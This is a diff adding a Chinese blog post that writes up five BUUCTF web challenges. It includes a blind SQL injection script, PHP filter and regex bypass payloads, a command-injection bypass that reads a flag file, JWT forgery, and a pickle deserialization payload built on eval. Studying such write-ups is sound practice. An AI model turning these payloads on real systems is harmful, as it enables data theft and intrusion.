@@ -1,0 +1,452 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>一周西踢艾福（4） | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="一周西踢艾福（4） | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="abbababaababab
+BUU
+[WUSTCTF2020]颜值成绩查询
+和[极客大挑战 2019]FinalSQL一样，复习一下布尔盲注的二分查找。脚本如下
+import requests
+import time
+
+url = &qu..." />
+    <meta name="keywords" content="CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              一周西踢艾福（4）
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-07-02
+              </span>
+              <span>
+                8 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/yi-zhou-xi-ti-ai-fu-4.jpeg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>abbababaababab</p>
+<h1 id="buu">BUU</h1>
+<h2 id="wustctf2020颜值成绩查询">[WUSTCTF2020]颜值成绩查询</h2>
+<p>和<code>[极客大挑战 2019]FinalSQL</code>一样，复习一下布尔盲注的二分查找。脚本如下</p>
+<pre><code class="language-python">import requests
+import time
+
+url = &quot;http://9a9cda55-1e8f-4cff-9221-917c5f669aba.node4.buuoj.cn:81/&quot;  # Target URL
+result = &quot;&quot;
+
+for i in range(1, 1000):  # adjust as needed
+    param_data = {}
+    low = 32
+    high = 128
+    mid = (low + high) // 2
+    while low &lt; high:
+        # injection_str = f&quot;1^(ASCII(substr((SELECT(group_concat(table_name))FROM(information_schema.tables)where(table_schema=database())),{i},1))&gt;{mid})&quot;     # 表名
+        # injection_str = f&quot;1^(ASCII(substr((SELECT(group_concat(column_name))FROM(information_schema.columns)where(table_name='flag')),{i},1))&gt;{mid})&quot;     # 列名
+        injection_str = f&quot;1^(ASCII(substr((SELECT(group_concat(value))FROM(flag)),{i},1))&gt;{mid})&quot;   # flag
+        param_data['stunum'] = injection_str
+
+        response = requests.get(url, params=param_data)
+        time.sleep(0.04)
+        if 'student number not exists.' in response.text:  # 在这个区域中
+            low = mid + 1
+        else:
+            high = mid
+        mid = (high + low) // 2
+
+    result += chr(mid)
+    print(&quot;Extracted so far: &quot; + result)
+    if mid == 32 or mid == 127:
+        break
+</code></pre>
+<h2 id="mrctf2020套娃">[MRCTF2020]套娃</h2>
+<pre><code class="language-php">$query = $_SERVER['QUERY_STRING'];
+
+ if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
+    die('Y0u are So cutE!');
+}
+ if($_GET['b_u_p_t'] !== '23333' &amp;&amp; preg_match('/^23333$/', $_GET['b_u_p_t'])){
+    echo &quot;you are going to the next ~&quot;;
+}
+</code></pre>
+<p><code>$_SERVER['QUERY_STRING'];</code>会获得 URL 中 &quot;?&quot; 符号之后的部分。举个例子，如果 URL 是 <code>http://www.example.com/index.php?id=1&amp;image=awesome.jpg</code>，那么 <code>$_SERVER['QUERY_STRING']</code> 就是 <code>id=1&amp;image=awesome.jpg</code>。</p>
+<p>第一个判断的是<code>$query</code>中不能出现下滑线。想起之前的一道题，PHP变量解析漏洞，绕过的方式可以用空格<code>%20</code>或者点<code>%2e</code>。但是<code>%2b</code>和<code>%5b</code>不知道为什么无法通过。<br>
+<img src="https://skyblu3519.github.io/post-images/1688291740971.png" alt="" loading="lazy"></p>
+<p>第二个判断是<code>$_GET['b_u_p_t']</code>不为<code>23333</code>，但通过正则可以匹配到<code>23333</code>。绕过的方式是用换行符<code>%0a</code>绕过。</p>
+<p>payload：<code>/?b%2eu%2ep%2et=23333%0A</code>，得到下一关地址<code>/secrettw.php</code></p>
+<p>jsfuck丢到控制台<br>
+<img src="https://skyblu3519.github.io/post-images/1688291775530.png" alt="" loading="lazy"></p>
+<p>根据提示，post提交<code>Merak</code>参数得到源码</p>
+<pre><code class="language-php">&lt;?php 
+error_reporting(0); 
+include 'takeip.php';
+ini_set('open_basedir','.'); 
+include 'flag.php';
+
+if(isset($_POST['Merak'])){ 
+    highlight_file(__FILE__); 
+    die(); 
+} 
+
+
+function change($v){ 
+    $v = base64_decode($v); 
+    $re = ''; 
+    for($i=0;$i&lt;strlen($v);$i++){ 
+        $re .= chr ( ord ($v[$i]) + $i*2 ); 
+    } 
+    return $re; 
+}
+echo 'Local access only!'.&quot;&lt;br/&gt;&quot;;
+$ip = getIp();
+if($ip!='127.0.0.1')
+echo &quot;Sorry,you don't have permission!  Your ip is :&quot;.$ip;
+if($ip === '127.0.0.1' &amp;&amp; file_get_contents($_GET['2333']) === 'todat is a happy day' ){
+echo &quot;Your REQUEST is:&quot;.change($_GET['file']);
+echo file_get_contents(change($_GET['file'])); }
+?&gt;
+</code></pre>
+<p>三个点：</p>
+<ul>
+<li><code>getIp()</code>：添加<code>client-ip</code>头</li>
+<li><code>file_get_contents($_GET['2333'])</code>：PHP伪协议<code>data:text/plain,todat is a happy day</code></li>
+<li><code>change($_GET['file'])</code>：根据<code>change</code>函数逻辑简单反解一下</li>
+</ul>
+<pre><code class="language-php">&lt;?php
+$t = 'flag.php';
+$re = '';
+for($i=0;$i&lt;strlen($t);$i++){
+    $re .= chr ( ord ($t[$i]) - $i*2 );
+}
+echo base64_encode($re);    // ZmpdYSZmXGI=
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1688291796730.png" alt="" loading="lazy"></figure>
+<h2 id="fbctf2019rceservice">[FBCTF2019]RCEService</h2>
+<p>命令执行<code>/?cmd={&quot;cmd&quot;:&quot;ls&quot;}</code>，有<code>index.php</code>，尝试读取。过滤了挺多东西的，之后发现这题的源码是提前给出的...但这里没有提示？（这个过滤确实够狠的）</p>
+<pre><code class="language-php">&lt;?php
+
+putenv('PATH=/home/rceservice/jail');
+
+if (isset($_REQUEST['cmd'])) {
+  $json = $_REQUEST['cmd'];
+
+  if (!is_string($json)) {
+    echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;';
+  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
+    echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;';
+  } else {
+    echo 'Attempting to run command:&lt;br/&gt;';
+    $cmd = json_decode($json, true)['cmd'];
+    if ($cmd !== NULL) {
+      system($cmd);
+    } else {
+      echo 'Invalid input';
+    }
+    echo '&lt;br/&gt;&lt;br/&gt;';
+  }
+}
+
+?&gt;
+</code></pre>
+<p>正则用多行匹配绕过，<code>cmd</code>期望接收到的是一个<code>JSON</code>格式，所以可以像下面这样：</p>
+<pre><code class="language-json">{
+  &quot;cmd&quot;: &quot;/home/rceservice&quot;
+}
+</code></pre>
+<p>因为这里设定了变量的执行环境，所以要用<code>/bin/cat</code>。payload：<code>cmd={%0a&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;%0a}</code><br>
+<img src="https://skyblu3519.github.io/post-images/1688291824587.png" alt="" loading="lazy"></p>
+<h2 id="zer0pts2020can-you-guess-it">[Zer0pts2020]Can you guess it?</h2>
+<pre><code class="language-php">&lt;?php
+include 'config.php'; // FLAG is defined in config.php
+
+if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
+  exit(&quot;I don't know what you are thinking, but I won't let you read it :)&quot;);
+}
+
+if (isset($_GET['source'])) {
+  highlight_file(basename($_SERVER['PHP_SELF']));
+  exit();
+}
+
+$secret = bin2hex(random_bytes(64));
+if (isset($_POST['guess'])) {
+  $guess = (string) $_POST['guess'];
+  if (hash_equals($secret, $guess)) {
+    $message = 'Congratulations! The flag is: ' . FLAG;
+  } else {
+    $message = 'Wrong.';
+  }
+}
+?&gt;
+</code></pre>
+<p>一看解题点就是<code>highlight_file</code>上。</p>
+<p>首先看下 <code>$_SERVER['PHP_SELF']</code>是什么，<br>
+<img src="https://skyblu3519.github.io/post-images/1688291849981.png" alt="" loading="lazy"></p>
+<p>写个demo</p>
+<pre><code class="language-php">&lt;?php
+echo $_SERVER['PHP_SELF'];
+</code></pre>
+<p><img src="https://skyblu3519.github.io/post-images/1688291916049.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1688291925664.png" alt="" loading="lazy"></p>
+<p>再看下<code>basename</code><br>
+<img src="https://skyblu3519.github.io/post-images/1688291935642.png" alt="" loading="lazy"></p>
+<p>测试一下：</p>
+<pre><code class="language-php">&lt;?php
+echo basename(&quot;/index.php/config.php&quot;);
+// config.php
+echo basename(&quot;/index.php/config.php/&quot;);
+// config.php
+echo basename(&quot;/index.php/config.php/&quot;.&quot;\xff&quot;);     
+// config.php		去掉了尾部的不可见字符
+echo basename(&quot;\xff&quot;.&quot;/index.php/config.php/&quot;);
+// config.php		去掉了首部的不可见字符
+</code></pre>
+<p>对于正则：</p>
+<pre><code class="language-php">&lt;?php
+$s = 'config.php/'.urldecode('%ff');
+if (preg_match('/config\.php\/*$/i', $s)) {		// 对尾部的界定可以用不可见字符绕过
+    echo &quot;match&quot;;
+}else{
+    echo &quot;no match&quot;;	// 绕过匹配
+}
+if (preg_match('/config\.php\//i', $s)) {			// 没有对尾部界定，可以匹配到字符串config.php/
+    echo &quot;match&quot;;			// 正常匹配
+}else{
+    echo &quot;no match&quot;;
+}
+</code></pre>
+<p>综上，用不可见字符绕过正则。payload：<code>/index.php/config.php/%ff?source</code><br>
+<img src="https://skyblu3519.github.io/post-images/1688291994505.png" alt="" loading="lazy"></p>
+<h2 id="ciscn2019-华北赛区-day1-web2ikun">[CISCN2019 华北赛区 Day1 Web2]ikun</h2>
+<p>要买到lv6，但是页面中并没有。爆破<code>/shop?page=2</code>中的<code>page</code>参数，找到有lv6的页面，标志图片名称。<br>
+<img src="https://skyblu3519.github.io/post-images/1688292003156.png" alt="" loading="lazy"></p>
+<pre><code class="language-python">import requests
+import time
+url = 'http://f07b7eb7-c746-470b-9d28-9053e401388c.node4.buuoj.cn:81/shop?page='
+for i in range(150, 200):
+    resp = requests.get(url + str(i))
+    time.sleep(0.04)
+    if 'lv6.png' in resp.text:
+        print('page is: ' + str(i))
+        break
+</code></pre>
+<p>lv6在180页<br>
+<img src="https://skyblu3519.github.io/post-images/1688292035545.png" alt="" loading="lazy"></p>
+<p>购买，价格改不了，但可以改折扣。<br>
+<img src="https://skyblu3519.github.io/post-images/1688292045515.png" alt="" loading="lazy"></p>
+<p><code>/b1g_m4mber</code>需要admin<br>
+<img src="https://skyblu3519.github.io/post-images/1688292054750.png" alt="" loading="lazy"></p>
+<p>jwt伪造</p>
+<ul>
+<li>快速入门：<a href="https://www.cnblogs.com/cjsblog/p/9277677.html">JWT是什么</a></li>
+<li>利用工具：<a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a></li>
+</ul>
+<p>使用<code>docker run -it --rm  jwtcrack &lt;jwt&gt;</code>，🏃🏃🏃<br>
+<img src="https://skyblu3519.github.io/post-images/1688292091525.png" alt="" loading="lazy"></p>
+<p>找到密钥直接伪造<a href="https://jwt.io/">jwt.io</a><br>
+<img src="https://skyblu3519.github.io/post-images/1688292100574.png" alt="" loading="lazy"></p>
+<p>F12找到源码<code>/static/asd1f654e683wq/www.zip</code></p>
+<p>路由定义在<code>/sshop/views/__init__.py</code></p>
+<pre><code class="language-python">from Shop import *
+from User import *
+from Admin import *
+
+
+handlers = [
+    (r'/', ShopIndexHandler),
+    (r'/shop', ShopListHandler),
+    (r'/info/(\d+)', ShopDetailHandler),
+    (r'/shopcar', ShopCarHandler),
+    (r'/shopcar/add', ShopCarAddHandler),
+    (r'/pay', ShopPayHandler),
+    (r'/user', UserInfoHandler),
+    (r'/user/change', changePasswordHandler),
+    (r'/pass/reset', ResetPasswordHanlder),
+    (r'/login', UserLoginHanlder),
+    (r'/logout', UserLogoutHandler),
+    (r'/register', RegisterHandler),
+    (r'/b1g_m4mber', AdminHandler)
+]
+</code></pre>
+<p>后门放在<code>AdminHandler</code>中，一眼反序列化<br>
+<img src="https://skyblu3519.github.io/post-images/1688292135756.png" alt="" loading="lazy"></p>
+<p>原理之后学学，这里先跟着打一遍。</p>
+<p>python2.7生成payload</p>
+<pre><code class="language-python">import os
+import pickle
+import urllib
+
+class exp(object):
+    def __reduce__(self):
+        return (eval,(&quot;open('/flag.txt').read()&quot;,))
+
+a=exp()
+s=pickle.dumps(a)
+print urllib.quote(s)
+# c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.
+</code></pre>
+<p><code>/b1g_m4mber</code>页面点击抓包<br>
+<img src="https://skyblu3519.github.io/post-images/1688292145192.png" alt="" loading="lazy"></p>
+<p>修改<code>become</code>，get flag!!!!<br>
+<img src="https://skyblu3519.github.io/post-images/1688292174201.png" alt="" loading="lazy"></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#buu">BUU</a>
+<ul>
+<li><a href="#wustctf2020%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2">[WUSTCTF2020]颜值成绩查询</a></li>
+<li><a href="#mrctf2020%E5%A5%97%E5%A8%83">[MRCTF2020]套娃</a></li>
+<li><a href="#fbctf2019rceservice">[FBCTF2019]RCEService</a></li>
+<li><a href="#zer0pts2020can-you-guess-it">[Zer0pts2020]Can you guess it?</a></li>
+<li><a href="#ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-day1-web2ikun">[CISCN2019 华北赛区 Day1 Web2]ikun</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/php-trick-zhi-preg_match/">
+              <h3 class="post-title">
+                PHP Trick 之 preg_match(/^.*/)
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
